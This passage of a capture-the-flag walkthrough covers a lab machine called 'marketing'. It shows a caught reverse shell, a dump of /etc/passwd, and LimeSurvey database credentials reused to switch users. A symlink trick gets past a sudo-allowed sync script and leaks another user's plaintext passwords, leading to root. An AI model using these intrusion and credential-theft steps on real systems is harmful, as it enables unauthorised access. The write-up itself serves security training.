+[+] Listening for reverse shells on 0.0.0.0:443 →  127.0.0.1 • 192.168.136.128 • 172.17.0.1 • 172.20.0.1 • 192.168.45.236
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] Got reverse shell from marketing~192.168.170.225-Linux-x86_64 😍 Assigned SessionID &lt;1&gt;
+[+] Attempting to upgrade shell to PTY...
+[+] Shell upgraded successfully using /usr/bin/python3! 💪
+[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
+[+] Logging to /home/kali/.penelope/sessions/marketing~192.168.170.225-Linux-x86_64/2026_01_28-02_07_20-684.log 📜
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+www-data@marketing:/$ whoami;id;hostname
+www-data
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+marketing
+www-data@marketing:/$ 
+</code></pre>
+<pre><code class="language-bash">www-data@marketing:/home$ ls -R
+.:
+m.sander  t.miller
+
+./m.sander:
+personal
+ls: cannot open directory './m.sander/personal': Permission denied
+
+./t.miller:
+local.txt
+</code></pre>
+<pre><code class="language-bash">www-data@marketing:/home/t.miller$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+t.miller:x:1000:1000::/home/t.miller:/bin/bash
+m.sander:x:1001:1001::/home/m.sander:/bin/bash
+mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
+</code></pre>
+<p>While manually enumerating the system, I found database credentials in <code>/var/www/LimeSurvey/application/config/config.php</code> .</p>
+<p><img alt="image-20260208152340910" src="./marketing.assets/image-20260208152340910.png" /></p>
+<p>Although the MySQL database contained no sensitive information, I successfully performed <strong>password reuse</strong> by testing these credentials against the user <code>t.miller</code> . This allowed me to pivot to a user shell.</p>
+<pre><code class="language-bash">www-data@marketing:/$ mysql -h localhost -u limesurvey_user -p'EzPwz2022_dev1$$23!!'
+mysql: [Warning] Using a password on the command line interface can be insecure.
+Welcome to the MySQL monitor.  Commands end with ; or \\g.
+Your MySQL connection id is 70
+Server version: 8.0.29-0ubuntu0.20.04.3 (Ubuntu)
+
+Copyright (c) 2000, 2022, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.
+
+mysql&gt; 
+mysql&gt; show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| limesurvey         |
++--------------------+
+2 rows in set (0.05 sec)
+</code></pre>
+<h1 id="shell-as-tmiller">Shell as <code>t.miller</code></h1>
+<pre><code class="language-bash">www-data@marketing:/$ su t.miller
+Password: 
+t.miller@marketing:/$ whoami;id;hostname
+t.miller
+uid=1000(t.miller) gid=1000(t.miller) groups=1000(t.miller),24(cdrom),46(plugdev),50(staff),100(users),119(mlocate)
+marketing
+</code></pre>
+<p>Found <code>local.txt</code></p>
+<pre><code class="language-bash">t.miller@marketing:~$ cat local.txt
+cb9...
+</code></pre>
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<p>Running <code>sudo -l</code> showed that <code>t.miller</code> could run <code>/usr/bin/sync.sh</code> as the user <code>m.sander</code> .</p>
+<pre><code class="language-bash">t.miller@marketing:/$ sudo -l
+Matching Defaults entries for t.miller on marketing:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin
+
+User t.miller may run the following commands on marketing:
+    (m.sander) /usr/bin/sync.sh
+</code></pre>
+<p>The <code>sync.sh</code> script is a file synchronization tool that overwrites a target file (<code>/home/m.sander/personal/notes.txt</code> ) if a difference is detected.</p>
+<pre><code class="language-bash">t.miller@marketing:/$ cat /usr/bin/sync.sh
+#! /bin/bash
+
+if [ -z $1 ]; then
+    echo &quot;error: note missing&quot;
+    exit
+fi
+
+note=$1
+
+if [[ &quot;$note&quot; =~ .*m.sander.* ]]; then
+    echo &quot;error: forbidden&quot;
+    exit
+fi
+
+difference=$(diff /home/m.sander/personal/notes.txt $note)
+
+if [[ -z $difference ]]; then
+    echo &quot;no update&quot;
+    exit
+fi
+
+echo &quot;Difference: $difference&quot;
+
+cp $note /home/m.sander/personal/notes.txt
+
+echo &quot;[+] Updated.&quot;
+</code></pre>
+<p>By providing an empty file as an argument, the <code>diff</code> command within the script leaked the entire contents of the target file to the terminal. However, it didn’t lead me to anything exploitable.</p>
+<pre><code class="language-bash">t.miller@marketing:/tmp$ touch /tmp/empty.txt
+t.miller@marketing:/tmp$ sudo -u m.sander /usr/bin/sync.sh /tmp/empty.txt 
+[sudo] password for t.miller: 
+Difference: 1,3d0
+&lt; == NOTES ==
+&lt; - remove vhost from website (done)
+&lt; - update to newer version (todo)
+\\ No newline at end of file
+[+] Updated.
+</code></pre>
+<p>Checking <code>/etc/group</code> revealed that both <code>t.miller</code> and <code>m.sander</code> belonged to the <code>mlocate</code> group.</p>
+<pre><code class="language-bash">t.miller@marketing:/$ cat /etc/group
+...
+mlocate:x:119:m.sander,t.miller
+</code></pre>
+<p>There is <code>mlocate.db</code> file that belongs to <code>mlocate</code> group.</p>
+<pre><code class="language-bash">t.miller@marketing:/tmp$ find / -group mlocate 2&gt;/dev/null
+/var/lib/mlocate/mlocate.db
+/usr/bin/mlocate
+</code></pre>
+<p><img alt="image-20260208152351325" src="./marketing.assets/image-20260208152351325.png" /></p>
+<pre><code class="language-bash">t.miller@marketing:/tmp$ cat mlocate_copy | grep m.sander
+Binary file (standard input) matches
+</code></pre>
+<p>I examined the <code>mlocate.db</code> file using <code>grep -a</code> (to treat the binary as text), which exposed a hidden file: <code>/home/m.sander/personal/creds-for-2022.txt</code> .</p>
+<pre><code class="language-bash">t.miller@marketing:/tmp$ cat mlocate_copy | grep -a m.sander
+</code></pre>
+<p><img alt="image-20260208152356677" src="./marketing.assets/image-20260208152356677.png" /></p>
+<p>The script blocks any path containing the string “<strong>m.sander.</strong>” To bypass this, I created a <strong>symbolic link</strong> in my current directory pointing to the credentials file <code>creds-for-2022.txt</code> .</p>
+<pre><code class="language-bash">t.miller@marketing:~$ ln -s /home/m.sander/personal/creds-for-2022.txt a_symlink
+</code></pre>
+<p>Since the link name did not contain the forbidden string, the script processed it, and the <code>diff</code> output revealed the passwords.</p>
+<pre><code class="language-bash">t.miller@marketing:~$ sudo -u m.sander /usr/bin/sync.sh a_symlink 
+Difference: 1,3c1,8
+&lt; == NOTES ==
+&lt; - remove vhost from website (done)
+&lt; - update to newer version (todo)
+\\ No newline at end of file
+---
+&gt; slack account:
+&gt; michael_sander@gmail.com - pa$$word@123$$4!!
+&gt; 
+&gt; github:
+&gt; michael_sander@gmail.com - EzPwz2022_dev1$$23!!
+&gt; 
+&gt; gmail:
+&gt; michael_sander@gmail.com - EzPwz2022_12345678#!
+\\ No newline at end of file
+[+] Updated.
+</code></pre>
+<h1 id="shell-as-msander">Shell as <code>m.sander</code></h1>
+<p>After logging in as <code>m.sander</code> , I checked the sudo permissions and found that the user had full sudo privileges (<code>ALL:ALL</code>).</p>
+<pre><code class="language-bash">t.miller@marketing:~$ su m.sander
+Password: 
+To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.
+See &quot;man sudo_root&quot; for details.
+
+m.sander@marketing:/home/t.miller$ whoami;id;hostname
+m.sander
+uid=1001(m.sander) gid=1001(m.sander) groups=1001(m.sander),24(cdrom),27(sudo),46(plugdev),50(staff),100(users),119(mlocate)
+marketing
+</code></pre>
+<pre><code class="language-bash">m.sander@marketing:/home/t.miller$ sudo -l
+[sudo] password for m.sander: 
+Matching Defaults entries for m.sander on marketing:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin
+
+User m.sander may run the following commands on marketing:
+    (ALL : ALL) ALL
+</code></pre>
+<h1 id="shell-as-root">Shell as <code>root</code></h1>
+<p>I executed <code>sudo /bin/bash -p</code> to obtain a root shell and completed the challenge.</p>
+<pre><code class="language-bash">m.sander@marketing:/home/t.miller$ sudo -l
+[sudo] password for m.sander: 
+Matching Defaults entries for m.sander on marketing:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin
+
+User m.sander may run the following commands on marketing:
+    (ALL : ALL) ALL
+</code></pre>
+<p>Found <code>proof.txt</code></p>
+<pre><code class="language-bash">root@marketing:~# cat proof.txt
+b2b...
+</code></pre>
+<footer>&copy; 2026 wook413.</footer>
+</div>
 </body>
 </html>
